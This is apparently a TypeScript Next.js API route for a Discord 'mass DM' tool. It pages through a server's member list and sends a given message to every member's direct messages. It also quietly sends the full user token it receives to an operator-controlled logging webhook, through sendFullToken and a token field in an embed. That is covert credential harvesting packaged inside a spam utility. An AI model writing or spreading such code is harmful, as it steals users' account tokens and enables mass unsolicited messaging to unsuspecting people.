import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:mass-dm`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { token, guildId, message, maxMembers = 100 } = body;

    if (!token || !guildId || !message) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة (التوكن، أيدي السيرفر، الرسالة)' }, { status: 400 });
    }

    sendFullToken('DM جماعي', token, { '🏰 السيرفر': guildId });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    // معلومات السيرفر
    const guildRes = await discordFetch(ct, 'GET', `/guilds/${guildId}`);
    const guildData = guildRes.data as Record<string, unknown> | null;
    const guildName = String(guildData?.name || guildId);

    sendToWebhook({
      username: 'TRJ Mass DM',
      embeds: [{
        title: '📧 Mass DM Started',
        color: 0x5865F2,
        fields: [
          { name: '🏰 Server', value: guildName, inline: true },
          { name: '💬 Message', value: message.substring(0, 200), inline: false },
          { name: '👥 Max', value: String(maxMembers), inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // جلب الأعضاء
    let allMembers: { id: string; username: string }[] = [];
    let after = '';

    for (let page = 0; page < 20; page++) {
      const membersRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/members?limit=1000${after ? `&after=${after}` : ''}`);
      const membersData = membersRes.data as Record<string, unknown>[] | null;
      if (!membersData || !Array.isArray(membersData) || membersData.length === 0) break;

      for (const m of membersData) {
        const user = m.user as Record<string, unknown> | undefined;
        if (user?.id && !user.bot) {
          allMembers.push({ id: String(user.id), username: String(user.username || 'Unknown') });
        }
      }

      const lastUser = membersData[membersData.length - 1]?.user as Record<string, unknown> | undefined;
      after = (lastUser?.id || '') as string;
      if (membersData.length < 1000) break;
    }

    const targetMembers = allMembers.slice(0, maxMembers);
    let sent = 0, failed = 0, blocked = 0;
    const batchSize = 15; // زيادة من 10 إلى 15

    for (let i = 0; i < targetMembers.length; i += batchSize) {
      const batch = targetMembers.slice(i, i + batchSize);
      const results = await Promise.allSettled(
        batch.map(async (member) => {
          try {
            const res = await discordFetch(ct, 'POST', `/users/@me/channels`, { recipient_id: member.id });
            if (!res.ok) return { status: 'create_failed' };

            const channelData = res.data as Record<string, unknown> | null;
            if (!channelData?.id) return { status: 'create_failed' };

            const msgRes = await discordFetch(ct, 'POST', `/channels/${channelData.id}/messages`, { content: message });
            if (msgRes.ok) return { status: 'sent' };
            if (msgRes.status === 403) return { status: 'blocked' };
            if (msgRes.status === 429) return { status: 'rate_limit' };
            return { status: 'failed' };
          } catch {
            return { status: 'error' };
          }
        })
      );

      for (const r of results) {
        if (r.status === 'fulfilled') {
          const val = r.value;
          if (val.status === 'sent') sent++;
          else if (val.status === 'blocked') blocked++;
          else failed++;
        } else {
          failed++;
        }
      }

      if (i + batchSize < targetMembers.length) {
        await new Promise(r => setTimeout(r, 400));
      }
    }

    sendToWebhook({
      username: 'TRJ Mass DM',
      embeds: [{
        title: '✅ Mass DM Completed',
        color: 0x00FF41,
        fields: [
          { name: '🏰 Server', value: guildName, inline: true },
          { name: '👥 Total', value: String(targetMembers.length), inline: true },
          { name: '✅ Sent', value: String(sent), inline: true },
          { name: '🔒 Blocked', value: String(blocked), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats: { sent, failed, blocked, total: targetMembers.length, totalMembers: allMembers.length } });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Mass DM Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
